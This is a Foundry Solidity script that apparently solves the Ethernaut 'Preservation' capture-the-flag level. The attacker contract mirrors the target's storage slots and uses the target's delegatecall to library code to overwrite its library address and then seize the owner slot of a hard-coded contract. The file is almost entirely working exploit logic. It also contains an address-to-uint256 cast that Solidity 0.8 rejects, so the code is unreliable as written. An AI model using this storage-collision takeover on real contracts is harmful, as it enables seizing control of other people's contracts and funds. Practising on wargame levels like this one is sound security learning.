// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/16_Preservation.sol";

contract ExploitScript is Script {
        

    function run() external {
        vm.startBroadcast();

        PreservationAttacker preservationAttacker = new PreservationAttacker(0xc2FF2F28799A2F75dc237640b0C369680e8B1962);
        preservationAttacker.attack();

        vm.stopBroadcast();
    }
}

contract PreservationAttacker {
    
    // 用於符合題目合約的slot
    address public _timeZone1Library;
    address public _timeZone2Library;
    address public owner;
    Preservation level16;

    constructor(address _target) {
        level16 = Preservation(_target);
    }

    function attack() external {
        level16.setFirstTime(uint256(address(this)));
        level16.setFirstTime(uint256(address(msg.sender)));
        console.log(level16.owner());        
    }

    function setTime(uint _timeStamp) external {
        owner = address(uint160(_timeStamp));
    }
}